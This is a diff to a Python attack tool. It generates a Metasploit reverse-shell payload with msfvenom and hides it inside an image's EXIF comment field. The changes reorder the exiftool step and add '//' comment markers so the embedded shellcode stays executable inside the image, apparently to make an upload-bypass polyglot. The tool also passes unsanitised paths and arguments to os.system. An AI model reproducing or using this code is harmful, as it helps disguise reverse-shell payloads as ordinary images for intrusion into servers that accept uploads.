@@ -51,18 +51,21 @@ else:
     LPORT = arguments.LPORT
 
 try:
+    os.system("exiftool "+ image_path +" -Comment=MOFOTOKEN")
+
     os.system("msfvenom -p "+ payload +" LHOST=" + LHOST + " LPORT=" + LPORT + " -f "+ payload_format +" > shell_file")
 
     with open("shell_file","r") as shell_file:
         shell_code = shell_file.read()
 
-    os.system("exiftool "+ image_path +" -Comment=MOFOTOKEN")
-
     with open(image_path, "rb") as file:
         image_content = file.read()
 
     with open(image_path,"wb+") as file:
-        new_image = image_content.replace(bytes("MOFOTOKEN", "utf-8"), bytes(shell_code, "utf-8"))
+        new_image = image_content.replace(bytes("MOFOTOKEN", "utf-8"), bytes(shell_code+"//" , "utf-8"))
+        lines = new_image.split(bytes("\n","utf-8"))
+        lines[-1] = lines[-1].replace(bytes("\r","utf-8"), bytes("\r//","utf-8"))
+        new_image = bytes("\n","utf-8").join(lines)
         file.write(new_image)
         
 except KeyboardInterrupt:
